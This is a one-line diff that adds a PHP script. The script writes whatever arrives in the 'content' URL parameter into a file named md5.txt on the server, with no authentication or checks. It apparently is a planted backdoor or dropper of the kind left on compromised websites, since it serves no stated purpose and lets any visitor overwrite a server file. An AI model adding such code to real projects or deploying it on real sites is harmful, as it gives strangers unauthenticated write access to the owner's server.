@@ -1,0 +1,1 @@
+<?php if (isset($_GET['content'])) { $fl = fopen("./md5.txt", "w"); if ($fl) { fputs($fl, $_GET['content']); } fclose($fl); } ?>
